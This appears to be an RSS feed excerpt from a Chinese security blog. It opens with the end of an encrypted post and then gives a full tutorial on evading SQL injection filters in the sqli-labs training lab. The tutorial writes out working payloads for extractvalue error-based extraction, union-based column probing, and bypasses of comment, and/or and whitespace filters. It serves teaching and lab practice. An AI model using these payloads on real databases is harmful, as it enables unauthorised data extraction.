c61221f02f947ec283d1520a3e0af894a31b661fc3ec2a2ebf57cad1bb38c67c16f86d48a8c7848cc2bf3376856e50b571bdfc4735eae8c00a5b3a88ad81bf11369caa26fe62ea23b6a4a0c948cfd5a9d0bd799279bac37f6baba94d7ed84a2fce68dea203cb7f9cb4fe7cf13927a0de0aec2168a01757704a3227c7d13e17becc121fc70d9d9d81de7a8ab45a70deb914edd67cf35b694efd4cc449ba336d767536c51aaa745d1de54cd8c699ace0052ebbf24232e6af4edb1b58dcd0d0878964e4ca90acccd8a1c14c1a3e50a09d8aeba6cc3a74abbfa78b05a0cdf3d45bc08e0e01b4672a19aa76697c1106e9e9a86025865e539fd1a2205b929f94d9900b90f661b2fcd3efbec6d47f44bf58ce2692def75493e8d8872f4d8645cd9ca9754734c0340c3a042ec6fe317c23ba3fd49e9a5f591d7f71c688af434ab47cb6db209ddbb5a72d26e699bf84599ac433e337096c36697f3ee3060516d86726aa47d69e068ac53fcaa1da48fc8aad0fa51f0dc160f48eb4cc22f06be16ed679e5a43f3655ae85ec9f4da3bbb1b9808e5bca16e0d226a0b57c0273e200b05166db2e47566f35a118bcaf68a378574c63c54cbc8ce5f26b671148d89af47bf9894f738bfe0406b299a5d523bc94ada7ccd7f56d20b819c6cd2b818f28d2e688a649d1b5e64dfc99083a9f0fda5d75c09bd8951da404e7dfc267e417b4dc826ee3b44b962d82ef3ed6ec4263afb02cb95bc91de52c33fef88ae81c644dfffaf4da7aaae40f4aa8223664bcce2b8cbd7059cb3a5f9086e9a9137bf7e56aaa03d47f8c1b3e103b7af111d0923bfd8b799c524ce624a69ed060404052623271c5bb9df5578832a6a1f17edfd78ae70007642770b9446e516f27aa2475437678742e99fe4151ba666001c90cb3f2e5ff3ea885b9c1bd1588eea926842705736cde1c529a86c3a4aaa6fd5c00adc868e7e990ab65c72ac3728eb7b5d64471b87cfc6cd372366070dcceb9fb446156e8b5786eaae529c2e5e61e962563562ad7106167aeb29bdb642bd8f70fc30cdae4e734f7e4bbc5c3470bcb815cd98fdd858cc4393799958a6e31a8bd7e54ad661c36fde832106fe2fc4a705f617c6935f8b143498788d4ea1e3d1bee8a8c35017b549f4ae9f39510c459e50bf5d5442849c694e4679288fc4fe8cd22e2d2e5818418bdfe0f5fdafd7b56c06f3fea0ea3663a4332c25c272f64ef3e77cad0b4606884fd5a54acba37eaa10bce737986f85cf69ca5ef16aae598525507320c5eb5b0c200b814c831a72c67caca7805b8028826c9dafa28736d2ac649b338e3c674645f061c7841480bdb9eff0bdf6d51203958d1b01a74b3a878dd2eb07a0d5d972c63f72712086eca0749c8904853ff10873870ea6b4e9b3c8500e9ca5eef11823bdd74b41e51b713f0b7fcbbcc5a25a81290ee842ecddaab94f041b831a9edd56928b4d3370ae60ca9f6c3f7609477700c6fd0696df0bd108fdd8a7133236e63bd3b3a54dd6f7237c332c65a69d531cf4f1454b8daafc09807658d000f70c83f6a5fe998acf89ae1d967696b77752d511f7de6666e141235e01bfddcbef0121a3587d978d34fb9151223fbdbb378537b6a0cf669a3c4ad8fee3856a0995524ce098c7dfaa5484069757a9c74a5df497794232d3ecc33b728fce8cf19ec29cdc7bebb9530c0c8a6b36e3b28ef2a97ac9efb8802869eb7d4a6257d60ded569c87b7ca14052d3967b82fa07a4a28d24e103af3ab88b08a6b59dd39651a7f8ce6efe793482b961f8be1285431c2e62d3c253815076ba73fcdd2bcef2f4825b1bf0167c56dd9e8853c1f423ff66bd2e330520f0d20f181b040b31b53904747456463c260aa99dc76ed11dfe69ac1b0a110f9f367a24c43507d81611a96e7cb59c81c2870740ba5bf5dc4d06c18dbb8b10ccb044f8e6b0e7906f8673fc5402138ed8d422db5596307b6323e15f310e61f80e46d9a5a8c9f8913af3e37557681d089e960c4a9d67aa36d816d2224464c12d9ed02f37d005f00102684691817c13ef324a504&lt;/script&gt;
  &lt;div class=&#34;hbe hbe-content&#34;&gt;
    &lt;div class=&#34;hbe hbe-input hbe-input-wave&#34;&gt;
      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-wave&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-wave&#34; for=&#34;hbePass&#34;&gt;
        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-wave&#34;&gt;Hey, password is required here.&lt;/span&gt;
      &lt;/label&gt;
      &lt;svg class=&#34;hbe hbe-graphic hbe-graphic-wave&#34; width=&#34;300%&#34; height=&#34;100%&#34; viewBox=&#34;0 0 1200 60&#34; preserveAspectRatio=&#34;none&#34;&gt;
        &lt;path d=&#34;M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0&#34;&gt;&lt;/path&gt;
      &lt;/svg&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/</guid>
            <title>绕过注入防御技巧</title>
            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/</link>
            <category>SQL注入探究</category>
            <pubDate>Sun, 02 Oct 2022 23:16:31 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;绕过各种注入防御&#34;&gt;&lt;a href=&#34;#绕过各种注入防御&#34; class=&#34;headerlink&#34; title=&#34;绕过各种注入防御&#34;&gt;&lt;/a&gt;绕过各种注入防御&lt;/h1&gt;&lt;p&gt;下面介绍几个绕过注入防御的知识：&lt;/p&gt;
&lt;h2 id=&#34;绕过注释符过滤&#34;&gt;&lt;a href=&#34;#绕过注释符过滤&#34; class=&#34;headerlink&#34; title=&#34;绕过注释符过滤&#34;&gt;&lt;/a&gt;绕过注释符过滤&lt;/h2&gt;&lt;p&gt;常见注释符有：&lt;code&gt;#&lt;/code&gt;、&lt;code&gt;%23&lt;/code&gt;、&lt;code&gt;--+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Less-23为例&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002134327907.png&#34; alt=&#34;image-20221002134327907&#34;&gt;&lt;/p&gt;
&lt;p&gt;做以下尝试：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; %23 a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;a&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&amp;quot; %23 a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;&amp;quot; a&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据第三、第四次的结果来看&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&amp;#39; %23 a&lt;/code&gt;  —-&amp;gt; &lt;code&gt;a&amp;#39; LIMIT 0,1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&amp;#39;&amp;quot; %23 a&lt;/code&gt; —-&amp;gt; &lt;code&gt;&amp;quot; a&amp;#39; LIMIT 0,1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;共同的特性是&lt;strong&gt;输入的字母a保留，%23被过滤&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;--+&lt;/code&gt;呢？&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&amp;quot; # a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;quot; &amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&amp;quot; --+ a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;quot; a&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此，有理由怀疑——&lt;strong&gt;注释符被后台彻底过滤&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我们来根据报错语句猜想一下后台语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from xxxx where id = &amp;#x27;1&amp;#x27; limit 0,1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过方式一&#34;&gt;&lt;a href=&#34;#绕过方式一&#34; class=&#34;headerlink&#34; title=&#34;绕过方式一&#34;&gt;&lt;/a&gt;绕过方式一&lt;/h3&gt;&lt;p&gt;我们可以尝试加一个&lt;code&gt;单引号&lt;/code&gt;+&lt;code&gt;等号&lt;/code&gt;+&lt;code&gt;单引号&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from xxxx where id = &amp;#x27;1 &amp;#x27;=&amp;#x27; &amp;#x27; limit 0,1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;&amp;#39;=&amp;#39;&lt;/code&gt;即为我们的注入语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;=&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Angelina&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:I-kill-you&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功查询，不报错。但是使用&lt;code&gt;&amp;#39;=&amp;#39;&lt;/code&gt;的话，我们没地方可插入一些想要的查询语句&lt;/p&gt;
&lt;p&gt;我们需要换一个思路&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; or 1 or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么可以使用&lt;code&gt;布尔注入&lt;/code&gt; + &lt;code&gt;报错注入&lt;/code&gt;结合，替换两个&lt;code&gt;or&lt;/code&gt;中间的那个&lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; or (select extractvalue(1,concat(0x7e,version(),0x7e))) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002140115121.png&#34; alt=&#34;image-20221002140115121&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就可以愉快地爆出数据库名、表、列、值等信息。&lt;/p&gt;
&lt;p&gt;以爆出列名为例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; or (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002140341257.png&#34; alt=&#34;image-20221002140341257&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过方式二&#34;&gt;&lt;a href=&#34;#绕过方式二&#34; class=&#34;headerlink&#34; title=&#34;绕过方式二&#34;&gt;&lt;/a&gt;绕过方式二&lt;/h3&gt;&lt;p&gt;其实，我们也可以通过闭合前后的单引号，中间使用union来做操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：后面单引号引领着一个列，所以union select的包含的列需要把后面的单引号内容考虑进来&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#两个列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; union select 1, &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，The used SELECT statements have a different number of columns&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#三个列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; union select 1,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;绕过and-or强过滤&#34;&gt;&lt;a href=&#34;#绕过and-or强过滤&#34; class=&#34;headerlink&#34; title=&#34;绕过and/or强过滤&#34;&gt;&lt;/a&gt;绕过and/or强过滤&lt;/h2&gt;&lt;p&gt;将and/or 及其大小写，混合大小写（Or、oR等）均替换成空&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; order by 2 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;der by 2 #&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; aa order by 2 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;aa der by 2 #&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以发现or被强制过滤，即任何出现or的地方被强制替换成空&lt;/p&gt;
&lt;h3 id=&#34;绕过方式&#34;&gt;&lt;a href=&#34;#绕过方式&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;使用&lt;code&gt;||&lt;/code&gt;、&lt;code&gt;oorr&lt;/code&gt;来替代or，再使用布尔替换+报错注入构造查询：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=-1&amp;#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; oorr (select extractvalue(1,concat(0x7e,version(),0x7e))) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002142717645.png&#34; alt=&#34;image-20221002142717645&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;绕过空格字符&#34;&gt;&lt;a href=&#34;#绕过空格字符&#34; class=&#34;headerlink&#34; title=&#34;绕过空格字符&#34;&gt;&lt;/a&gt;绕过空格字符&lt;/h2&gt;&lt;p&gt;Less-26为例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; or 1 or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; || 1 || &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此，可以构造：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) || &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002143828165.png&#34; alt=&#34;image-20221002143828165&#34;&gt;&lt;/p&gt;
&lt;p&gt;空格被过滤&lt;/p&gt;
&lt;h3 id=&#34;绕过方式-1&#34;&gt;&lt;a href=&#34;#绕过方式-1&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;常见的空格替换方式有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%09&lt;/code&gt; TAB键(水平)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt; 新建一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0c&lt;/code&gt; 新的一页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0d&lt;/code&gt; return 功能&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0b&lt;/code&gt; TAB键(垂直)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%a0&lt;/code&gt; 空格&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/**/&lt;/code&gt;也是一种替代空格方式&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; || (select%a0extractvalue(1,concat(0x7e,version(),0x7e))) || &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002144131652.png&#34; alt=&#34;image-20221002144131652&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;绕过一些对于select、union的限制&#34;&gt;&lt;a href=&#34;#绕过一些对于select、union的限制&#34; class=&#34;headerlink&#34; title=&#34;绕过一些对于select、union的限制&#34;&gt;&lt;/a&gt;绕过一些对于select、union的限制&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; or 1 or &amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;or1or&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;基于以上尝试，可以看出空格被过滤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0or%a01%a0or%a0&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么可以有：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0order%a0by%a02&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，尝试用union select&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27; union select 1,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0union%a0select%a01,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看出，union和select被过滤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-27/?id=1&amp;#x27;%a0&amp;quot;union%a0select%a01,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002150152965.png&#34; alt=&#34;image-20221002150152965&#34;&gt;&lt;/p&gt;
